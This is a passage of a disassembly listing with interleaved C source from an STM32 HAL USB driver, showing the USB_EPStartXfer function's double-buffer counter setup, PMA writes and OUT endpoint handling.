 80074ea:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80074ec:	881b      	ldrh	r3, [r3, #0]
 80074ee:	b29b      	uxth	r3, r3
 80074f0:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80074f4:	b29a      	uxth	r2, r3
 80074f6:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80074f8:	801a      	strh	r2, [r3, #0]
 80074fa:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074fe:	2b3e      	cmp	r3, #62	; 0x3e
 8007500:	d921      	bls.n	8007546 <USB_EPStartXfer+0xac0>
 8007502:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007506:	095b      	lsrs	r3, r3, #5
 8007508:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 800750c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007510:	f003 031f 	and.w	r3, r3, #31
 8007514:	2b00      	cmp	r3, #0
 8007516:	d104      	bne.n	8007522 <USB_EPStartXfer+0xa9c>
 8007518:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 800751c:	3b01      	subs	r3, #1
 800751e:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007522:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007524:	881b      	ldrh	r3, [r3, #0]
 8007526:	b29a      	uxth	r2, r3
 8007528:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 800752c:	b29b      	uxth	r3, r3
 800752e:	029b      	lsls	r3, r3, #10
 8007530:	b29b      	uxth	r3, r3
 8007532:	4313      	orrs	r3, r2
 8007534:	b29b      	uxth	r3, r3
 8007536:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800753a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800753e:	b29a      	uxth	r2, r3
 8007540:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007542:	801a      	strh	r2, [r3, #0]
 8007544:	e050      	b.n	80075e8 <USB_EPStartXfer+0xb62>
 8007546:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800754a:	2b00      	cmp	r3, #0
 800754c:	d10a      	bne.n	8007564 <USB_EPStartXfer+0xade>
 800754e:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007550:	881b      	ldrh	r3, [r3, #0]
 8007552:	b29b      	uxth	r3, r3
 8007554:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007558:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800755c:	b29a      	uxth	r2, r3
 800755e:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007560:	801a      	strh	r2, [r3, #0]
 8007562:	e041      	b.n	80075e8 <USB_EPStartXfer+0xb62>
 8007564:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007568:	085b      	lsrs	r3, r3, #1
 800756a:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 800756e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007572:	f003 0301 	and.w	r3, r3, #1
 8007576:	2b00      	cmp	r3, #0
 8007578:	d004      	beq.n	8007584 <USB_EPStartXfer+0xafe>
 800757a:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 800757e:	3301      	adds	r3, #1
 8007580:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007584:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007586:	881b      	ldrh	r3, [r3, #0]
 8007588:	b29a      	uxth	r2, r3
 800758a:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 800758e:	b29b      	uxth	r3, r3
 8007590:	029b      	lsls	r3, r3, #10
 8007592:	b29b      	uxth	r3, r3
 8007594:	4313      	orrs	r3, r2
 8007596:	b29a      	uxth	r2, r3
 8007598:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800759a:	801a      	strh	r2, [r3, #0]
 800759c:	e024      	b.n	80075e8 <USB_EPStartXfer+0xb62>
 800759e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075a2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075a6:	681b      	ldr	r3, [r3, #0]
 80075a8:	785b      	ldrb	r3, [r3, #1]
 80075aa:	2b01      	cmp	r3, #1
 80075ac:	d11c      	bne.n	80075e8 <USB_EPStartXfer+0xb62>
 80075ae:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075b2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80075b6:	681b      	ldr	r3, [r3, #0]
 80075b8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80075bc:	b29b      	uxth	r3, r3
 80075be:	461a      	mov	r2, r3
 80075c0:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 80075c2:	4413      	add	r3, r2
 80075c4:	673b      	str	r3, [r7, #112]	; 0x70
 80075c6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075ca:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075ce:	681b      	ldr	r3, [r3, #0]
 80075d0:	781b      	ldrb	r3, [r3, #0]
 80075d2:	00da      	lsls	r2, r3, #3
 80075d4:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 80075d6:	4413      	add	r3, r2
 80075d8:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80075dc:	66fb      	str	r3, [r7, #108]	; 0x6c
 80075de:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80075e2:	b29a      	uxth	r2, r3
 80075e4:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 80075e6:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr1;
 80075e8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075ec:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075f0:	681b      	ldr	r3, [r3, #0]
 80075f2:	895b      	ldrh	r3, [r3, #10]
 80075f4:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80075f8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075fc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007600:	681b      	ldr	r3, [r3, #0]
 8007602:	6959      	ldr	r1, [r3, #20]
 8007604:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007608:	b29b      	uxth	r3, r3
 800760a:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 800760e:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007612:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007616:	6800      	ldr	r0, [r0, #0]
 8007618:	f000 ff41 	bl	800849e <USB_WritePMA>
 800761c:	e0ca      	b.n	80077b4 <USB_EPStartXfer+0xd2e>
        }
        else
        {
          /* Set the Double buffer counter for pmabuffer0 */
          PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 800761e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007622:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007626:	681b      	ldr	r3, [r3, #0]
 8007628:	785b      	ldrb	r3, [r3, #1]
 800762a:	2b00      	cmp	r3, #0
 800762c:	d177      	bne.n	800771e <USB_EPStartXfer+0xc98>
 800762e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007632:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007636:	681b      	ldr	r3, [r3, #0]
 8007638:	67fb      	str	r3, [r7, #124]	; 0x7c
 800763a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800763e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007642:	681b      	ldr	r3, [r3, #0]
 8007644:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007648:	b29b      	uxth	r3, r3
 800764a:	461a      	mov	r2, r3
 800764c:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 800764e:	4413      	add	r3, r2
 8007650:	67fb      	str	r3, [r7, #124]	; 0x7c
 8007652:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007656:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800765a:	681b      	ldr	r3, [r3, #0]
 800765c:	781b      	ldrb	r3, [r3, #0]
 800765e:	00da      	lsls	r2, r3, #3
 8007660:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 8007662:	4413      	add	r3, r2
 8007664:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007668:	67bb      	str	r3, [r7, #120]	; 0x78
 800766a:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800766c:	881b      	ldrh	r3, [r3, #0]
 800766e:	b29b      	uxth	r3, r3
 8007670:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007674:	b29a      	uxth	r2, r3
 8007676:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007678:	801a      	strh	r2, [r3, #0]
 800767a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800767e:	2b3e      	cmp	r3, #62	; 0x3e
 8007680:	d921      	bls.n	80076c6 <USB_EPStartXfer+0xc40>
 8007682:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007686:	095b      	lsrs	r3, r3, #5
 8007688:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 800768c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007690:	f003 031f 	and.w	r3, r3, #31
 8007694:	2b00      	cmp	r3, #0
 8007696:	d104      	bne.n	80076a2 <USB_EPStartXfer+0xc1c>
 8007698:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 800769c:	3b01      	subs	r3, #1
 800769e:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 80076a2:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80076a4:	881b      	ldrh	r3, [r3, #0]
 80076a6:	b29a      	uxth	r2, r3
 80076a8:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 80076ac:	b29b      	uxth	r3, r3
 80076ae:	029b      	lsls	r3, r3, #10
 80076b0:	b29b      	uxth	r3, r3
 80076b2:	4313      	orrs	r3, r2
 80076b4:	b29b      	uxth	r3, r3
 80076b6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80076ba:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80076be:	b29a      	uxth	r2, r3
 80076c0:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80076c2:	801a      	strh	r2, [r3, #0]
 80076c4:	e05c      	b.n	8007780 <USB_EPStartXfer+0xcfa>
 80076c6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80076ca:	2b00      	cmp	r3, #0
 80076cc:	d10a      	bne.n	80076e4 <USB_EPStartXfer+0xc5e>
 80076ce:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80076d0:	881b      	ldrh	r3, [r3, #0]
 80076d2:	b29b      	uxth	r3, r3
 80076d4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80076d8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80076dc:	b29a      	uxth	r2, r3
 80076de:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80076e0:	801a      	strh	r2, [r3, #0]
 80076e2:	e04d      	b.n	8007780 <USB_EPStartXfer+0xcfa>
 80076e4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80076e8:	085b      	lsrs	r3, r3, #1
 80076ea:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 80076ee:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80076f2:	f003 0301 	and.w	r3, r3, #1
 80076f6:	2b00      	cmp	r3, #0
 80076f8:	d004      	beq.n	8007704 <USB_EPStartXfer+0xc7e>
 80076fa:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 80076fe:	3301      	adds	r3, #1
 8007700:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007704:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007706:	881b      	ldrh	r3, [r3, #0]
 8007708:	b29a      	uxth	r2, r3
 800770a:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 800770e:	b29b      	uxth	r3, r3
 8007710:	029b      	lsls	r3, r3, #10
 8007712:	b29b      	uxth	r3, r3
 8007714:	4313      	orrs	r3, r2
 8007716:	b29a      	uxth	r2, r3
 8007718:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800771a:	801a      	strh	r2, [r3, #0]
 800771c:	e030      	b.n	8007780 <USB_EPStartXfer+0xcfa>
 800771e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007722:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007726:	681b      	ldr	r3, [r3, #0]
 8007728:	785b      	ldrb	r3, [r3, #1]
 800772a:	2b01      	cmp	r3, #1
 800772c:	d128      	bne.n	8007780 <USB_EPStartXfer+0xcfa>
 800772e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007732:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007736:	681b      	ldr	r3, [r3, #0]
 8007738:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 800773c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007740:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007744:	681b      	ldr	r3, [r3, #0]
 8007746:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800774a:	b29b      	uxth	r3, r3
 800774c:	461a      	mov	r2, r3
 800774e:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 8007752:	4413      	add	r3, r2
 8007754:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 8007758:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800775c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007760:	681b      	ldr	r3, [r3, #0]
 8007762:	781b      	ldrb	r3, [r3, #0]
 8007764:	00da      	lsls	r2, r3, #3
 8007766:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 800776a:	4413      	add	r3, r2
 800776c:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007770:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 8007774:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007778:	b29a      	uxth	r2, r3
 800777a:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 800777e:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 8007780:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007784:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007788:	681b      	ldr	r3, [r3, #0]
 800778a:	891b      	ldrh	r3, [r3, #8]
 800778c:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007790:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007794:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007798:	681b      	ldr	r3, [r3, #0]
 800779a:	6959      	ldr	r1, [r3, #20]
 800779c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80077a0:	b29b      	uxth	r3, r3
 80077a2:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80077a6:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80077aa:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80077ae:	6800      	ldr	r0, [r0, #0]
 80077b0:	f000 fe75 	bl	800849e <USB_WritePMA>
        }
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_VALID);
 80077b4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077b8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80077bc:	681a      	ldr	r2, [r3, #0]
 80077be:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077c2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077c6:	681b      	ldr	r3, [r3, #0]
 80077c8:	781b      	ldrb	r3, [r3, #0]
 80077ca:	009b      	lsls	r3, r3, #2
 80077cc:	4413      	add	r3, r2
 80077ce:	881b      	ldrh	r3, [r3, #0]
 80077d0:	b29b      	uxth	r3, r3
 80077d2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80077d6:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80077da:	817b      	strh	r3, [r7, #10]
 80077dc:	897b      	ldrh	r3, [r7, #10]
 80077de:	f083 0310 	eor.w	r3, r3, #16
 80077e2:	817b      	strh	r3, [r7, #10]
 80077e4:	897b      	ldrh	r3, [r7, #10]
 80077e6:	f083 0320 	eor.w	r3, r3, #32
 80077ea:	817b      	strh	r3, [r7, #10]
 80077ec:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077f0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80077f4:	681a      	ldr	r2, [r3, #0]
 80077f6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077fa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077fe:	681b      	ldr	r3, [r3, #0]
 8007800:	781b      	ldrb	r3, [r3, #0]
 8007802:	009b      	lsls	r3, r3, #2
 8007804:	441a      	add	r2, r3
 8007806:	897b      	ldrh	r3, [r7, #10]
 8007808:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800780c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007810:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007814:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8007818:	b29b      	uxth	r3, r3
 800781a:	8013      	strh	r3, [r2, #0]
 800781c:	f000 bcde 	b.w	80081dc <USB_EPStartXfer+0x1756>
  }
  else /* OUT endpoint */
  {
    if (ep->doublebuffer == 0U)
 8007820:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007824:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007828:	681b      	ldr	r3, [r3, #0]
 800782a:	7b1b      	ldrb	r3, [r3, #12]
 800782c:	2b00      	cmp	r3, #0
 800782e:	f040 80bb 	bne.w	80079a8 <USB_EPStartXfer+0xf22>
    {
      /* Multi packet transfer */
      if (ep->xfer_len > ep->maxpacket)
 8007832:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007836:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800783a:	681b      	ldr	r3, [r3, #0]
 800783c:	699a      	ldr	r2, [r3, #24]
 800783e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007842:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007846:	681b      	ldr	r3, [r3, #0]
 8007848:	691b      	ldr	r3, [r3, #16]
 800784a:	429a      	cmp	r2, r3
 800784c:	d917      	bls.n	800787e <USB_EPStartXfer+0xdf8>
      {
        len = ep->maxpacket;
 800784e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007852:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007856:	681b      	ldr	r3, [r3, #0]
 8007858:	691b      	ldr	r3, [r3, #16]
 800785a:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len -= len;
 800785e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007862:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007866:	681b      	ldr	r3, [r3, #0]
 8007868:	699a      	ldr	r2, [r3, #24]
 800786a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800786e:	1ad2      	subs	r2, r2, r3
 8007870:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007874:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007878:	681b      	ldr	r3, [r3, #0]
 800787a:	619a      	str	r2, [r3, #24]
 800787c:	e00e      	b.n	800789c <USB_EPStartXfer+0xe16>
      }
      else
      {
        len = ep->xfer_len;
 800787e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007882:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007886:	681b      	ldr	r3, [r3, #0]
 8007888:	699b      	ldr	r3, [r3, #24]
 800788a:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len = 0U;
 800788e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007892:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007896:	681b      	ldr	r3, [r3, #0]
 8007898:	2200      	movs	r2, #0
 800789a:	619a      	str	r2, [r3, #24]
      }
      /* configure and validate Rx endpoint */
      PCD_SET_EP_RX_CNT(USBx, ep->num, len);
 800789c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80078a0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80078a4:	681b      	ldr	r3, [r3, #0]
 80078a6:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 80078aa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80078ae:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80078b2:	681b      	ldr	r3, [r3, #0]
 80078b4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80078b8:	b29b      	uxth	r3, r3
 80078ba:	461a      	mov	r2, r3
 80078bc:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 80078c0:	4413      	add	r3, r2
 80078c2:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 80078c6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80078ca:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80078ce:	681b      	ldr	r3, [r3, #0]
 80078d0:	781b      	ldrb	r3, [r3, #0]
 80078d2:	00da      	lsls	r2, r3, #3
 80078d4:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 80078d8:	4413      	add	r3, r2
 80078da:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80078de:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
 80078e2:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80078e6:	881b      	ldrh	r3, [r3, #0]
 80078e8:	b29b      	uxth	r3, r3
 80078ea:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80078ee:	b29a      	uxth	r2, r3
 80078f0:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80078f4:	801a      	strh	r2, [r3, #0]
 80078f6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078fa:	2b3e      	cmp	r3, #62	; 0x3e
 80078fc:	d924      	bls.n	8007948 <USB_EPStartXfer+0xec2>
 80078fe:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007902:	095b      	lsrs	r3, r3, #5
 8007904:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007908:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800790c:	f003 031f 	and.w	r3, r3, #31
 8007910:	2b00      	cmp	r3, #0
 8007912:	d104      	bne.n	800791e <USB_EPStartXfer+0xe98>
 8007914:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007918:	3b01      	subs	r3, #1
 800791a:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 800791e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007922:	881b      	ldrh	r3, [r3, #0]
 8007924:	b29a      	uxth	r2, r3
 8007926:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 800792a:	b29b      	uxth	r3, r3
 800792c:	029b      	lsls	r3, r3, #10
 800792e:	b29b      	uxth	r3, r3
 8007930:	4313      	orrs	r3, r2
 8007932:	b29b      	uxth	r3, r3
 8007934:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007938:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800793c:	b29a      	uxth	r2, r3
 800793e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007942:	801a      	strh	r2, [r3, #0]
 8007944:	f000 bc10 	b.w	8008168 <USB_EPStartXfer+0x16e2>
 8007948:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800794c:	2b00      	cmp	r3, #0
 800794e:	d10c      	bne.n	800796a <USB_EPStartXfer+0xee4>
 8007950:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007954:	881b      	ldrh	r3, [r3, #0]
 8007956:	b29b      	uxth	r3, r3
 8007958:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800795c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007960:	b29a      	uxth	r2, r3
 8007962:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007966:	801a      	strh	r2, [r3, #0]
 8007968:	e3fe      	b.n	8008168 <USB_EPStartXfer+0x16e2>
 800796a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800796e:	085b      	lsrs	r3, r3, #1
 8007970:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007974:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007978:	f003 0301 	and.w	r3, r3, #1
 800797c:	2b00      	cmp	r3, #0
 800797e:	d004      	beq.n	800798a <USB_EPStartXfer+0xf04>
 8007980:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007984:	3301      	adds	r3, #1
 8007986:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 800798a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800798e:	881b      	ldrh	r3, [r3, #0]
 8007990:	b29a      	uxth	r2, r3
 8007992:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007996:	b29b      	uxth	r3, r3
 8007998:	029b      	lsls	r3, r3, #10
 800799a:	b29b      	uxth	r3, r3
 800799c:	4313      	orrs	r3, r2
 800799e:	b29a      	uxth	r2, r3
 80079a0:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80079a4:	801a      	strh	r2, [r3, #0]
 80079a6:	e3df      	b.n	8008168 <USB_EPStartXfer+0x16e2>
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* First Transfer Coming From HAL_PCD_EP_Receive & From ISR */
      /* Set the Double buffer counter */
      if (ep->type == EP_TYPE_BULK)
 80079a8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079ac:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079b0:	681b      	ldr	r3, [r3, #0]
 80079b2:	78db      	ldrb	r3, [r3, #3]
 80079b4:	2b02      	cmp	r3, #2
 80079b6:	f040 8218 	bne.w	8007dea <USB_EPStartXfer+0x1364>
      {
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, ep->maxpacket);
 80079ba:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079be:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079c2:	681b      	ldr	r3, [r3, #0]
 80079c4:	785b      	ldrb	r3, [r3, #1]
 80079c6:	2b00      	cmp	r3, #0
 80079c8:	f040 809d 	bne.w	8007b06 <USB_EPStartXfer+0x1080>
 80079cc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079d0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80079d4:	681b      	ldr	r3, [r3, #0]
 80079d6:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 80079da:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079de:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80079e2:	681b      	ldr	r3, [r3, #0]
 80079e4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80079e8:	b29b      	uxth	r3, r3
 80079ea:	461a      	mov	r2, r3
 80079ec:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 80079f0:	4413      	add	r3, r2
 80079f2:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 80079f6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079fa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079fe:	681b      	ldr	r3, [r3, #0]
 8007a00:	781b      	ldrb	r3, [r3, #0]
 8007a02:	00da      	lsls	r2, r3, #3
 8007a04:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 8007a08:	4413      	add	r3, r2
 8007a0a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007a0e:	f8c7 30a8 	str.w	r3, [r7, #168]	; 0xa8
 8007a12:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a16:	881b      	ldrh	r3, [r3, #0]
 8007a18:	b29b      	uxth	r3, r3
 8007a1a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007a1e:	b29a      	uxth	r2, r3
 8007a20:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a24:	801a      	strh	r2, [r3, #0]
 8007a26:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a2a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a2e:	681b      	ldr	r3, [r3, #0]
 8007a30:	691b      	ldr	r3, [r3, #16]
 8007a32:	2b3e      	cmp	r3, #62	; 0x3e
 8007a34:	d92b      	bls.n	8007a8e <USB_EPStartXfer+0x1008>
 8007a36:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a3a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a3e:	681b      	ldr	r3, [r3, #0]
